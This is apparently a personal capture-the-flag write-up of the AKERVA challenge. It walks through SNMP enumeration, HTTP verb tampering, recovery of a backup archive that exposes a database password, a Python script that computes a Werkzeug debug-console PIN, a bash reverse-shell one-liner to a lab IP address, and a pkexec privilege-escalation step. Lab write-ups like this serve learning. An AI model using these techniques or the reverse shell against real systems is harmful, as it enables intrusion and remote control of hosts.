# Information
- CTF Name: 
- CTF Level:
- CTF Description: 
- Date: 
- Platform: 
- Category: 

# Findings
###### Flags
1. `AKERVA{Ikn0w_F0rgoTTEN#CoMmeNts}`
2. `AKERVA{IkN0w_SnMP@@@MIsconfigur@T!onS}`
3. `AKERVA{IKNoW###VeRbTamper!nG_==}`
4. `AKERVA{1kn0w_H0w_TO_$Cr1p_T_$$$$$$$$}`
5. `AKERVA{IKNOW#LFi_@_}`
6. `AKERVA{IkNOW#=ByPassWerkZeugPinC0de!}`
7. `AKERVA{IkNow_Sud0_sUckS!}`
8. .
## External
### Enumeration
- ![](https://i.imgur.com/Mdc8mg7.png)
- ![](https://i.imgur.com/rRJ8jvD.png)

#### Port `80`
![](https://i.imgur.com/bQ919h1.png)
![](https://i.imgur.com/rbSuP4y.png)
![](https://i.imgur.com/aXPQ4zI.png)
![](https://i.imgur.com/qTBlqIg.png)
#### Port `5000`
- it is same with port `80` `/scripts`
	- ![](https://i.imgur.com/yuDVinJ.png)
- ![](https://i.imgur.com/apHLt2h.png)

<!--⚠️Imgur upload failed, check dev console-->
![[Pasted image 20240512213011.png]]
To crack and bypass this pin login, i need some kind of information disclosure, and i was stuck. but when i was back to my nmap scans, there were port `161` open that can leak some information so lets check that.
![](https://i.imgur.com/spIfLe4.png)

```shell
3 = STRING: "sh"
iso.3.6.1.2.1.25.4.2.1.2.1235 = STRING: "check_backup.sh"
iso.3.6.1.2.1.25.4.2.1.2.1239 = STRING: "backup_every_17"
```
![](https://i.imgur.com/5WeOOI5.png)
`c python /tmp/.wpzswsgl/.wptnzssj /usr/bin/pkexec /tmp/.wpzswsgl/dfxaciipk/dfxaciipk.so dfxaciipk uzmexkmxyb`
![](https://i.imgur.com/aIa2c45.png)
- We have got `scripts` from our enum part. so this script can be on there, but when i access the page it says access deined. so from my [[921. 🕷Web attacks]] class we have seen HTTP Verb Tampering this is HTTP auth. so lets use that and bOOM We got the file,.
![](https://i.imgur.com/hSryqNG.png)
```bash

#!/bin/bash
#
# This script performs backups of production and development websites.
# Backups are done every 17 minutes.
#
# AKERVA{IKNoW###VeRbTamper!nG_==}
#

SAVE_DIR=/var/www/html/backups

while true
do
	ARCHIVE_NAME=backup_$(date +%Y%m%d%H%M%S)
	echo "Erasing old backups..."
	rm -rf $SAVE_DIR/*

	echo "Backuping..."
	zip -r $SAVE_DIR/$ARCHIVE_NAME /var/www/html/*

	echo "Done..."
	sleep 1020
done
```
- to get the folder i need to get the `backup_XXXXXX` dates. for that i can get the year,month,date and hour except the sec and min
- ![](https://i.imgur.com/7nDZXt8.png)
- for that i went fro bruteforce.
![](https://i.imgur.com/5pelrSF.png)

and got the file
![](https://i.imgur.com/oC7nbgV.png)
```shell
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'wordpress' );

/** MySQL database password */
define( 'DB_PASSWORD', 'ZokDHE_DJ_____enzU)=' );
```
![](https://i.imgur.com/lo3BILY.png)
![](https://i.imgur.com/C4G4pc9.png)
- Cred for 5000` aas : AKERVA{1kn0w_H0w_TO_$Cr1p_T_$$$$$$$$} `
- I followed [this blog](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug) and [thisCTF](https://arz101.medium.com/hackthebox-agile-19a3559ad04a) and got all the Things except the Interface needs little bit tweak so i did that and got the pin for the console.
![](https://i.imgur.com/tlzA5Rk.png)
```python
import hashlib
from itertools import chain
probably_public_bits = [
        'aas',# username
        'flask.app',# modname
        'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
        '/usr/local/lib/python2.7/dist-packages/flask/app.pyc' # getattr(mod, '__file__', None),
]

private_bits = [
        '345052366760',# str(uuid.getnode()),  /sys/class/net/ens33/address
        '258f132cd7e647caaf5510e3aca997c1'# get_machine_id(), /etc/machine-id
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
        if not bit:
                continue
        if isinstance(bit, str):
                bit = bit.encode('utf-8')
        h.update(bit)
h.update(b'cookiesalt')
#h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
        h.update(b'pinsalt')
        num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
        for group_size in 5, 4, 3:
                if len(num) % group_size == 0:
                        rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                                                  for x in range(0, len(num), group_size))
                        break
        else:
                rv = num

print(rv)
```
### Gaining Access
![](https://i.imgur.com/YRauvdJ.png)
`import os;os.popen('/bin/bash -c "bash -i >& /dev/tcp/10.10.14.3/8003 0>&1"')`
![](https://i.imgur.com/zdEU6Rb.png)


## Internal
### Enumeration
`Sudo version 1.8.21p2`
```
 python /tmp/.wpzswsgl/.wptnzssj /usr/bin/pkexec /tmp/.wpzswsgl/dfxaciipk/dfxaciipk.so dfxaciipk uzmexkmxyb
 
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* * * * * aas /opt/check_backup.sh
* * * * * aas /opt/check_devSite.sh

╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN      320/sh
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -


-rwsr-xr-x 1 root root 22K Mar 27  2019 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)


/home/aas/.hiddenflag.txt

/tmp/.greper/pspy64
/tmp/.greper/shell-1337
```
### Gaining Access
![](https://i.imgur.com/fBaw1oA.png)
### Maintaining Access
```shell
(remote) root@Leakage:/root$ cat secured_note.md
R09BSEdIRUVHU0FFRUhBQ0VHVUxSRVBFRUVDRU9LTUtFUkZTRVNGUkxLRVJVS1RTVlBNU1NOSFNLUkZGQUdJQVBWRVRDTk1ETFZGSERBT0dGTEFGR1NLRVVMTVZPT1dXQ0FIQ1JGVlZOVkhWQ01TWUVMU1BNSUhITU9EQVVLSEUK

@AKERVA_FR | @lydericlefebvre


-?> It was base64 -> Vigera...(i got the Cipher type from dcode) -> then check the alphabets some of them are not there and remove them for i used(https://wilsoa.github.io/gallery/frequency_analysis.html) after that when u check the answer there is some meaning word.

WELLDONE FOR SOLVING THIS CHALLENGE YOU CAN SEND YOUR RESUME HERE A TRECRUTEMEN TAKER VACOMAND VALIDATE THE LAST FLAG WITH AKERVA{IKNOOOWVIGEEENERRRE}
```
![](https://i.imgur.com/RTx30Lr.png)
# Random Notes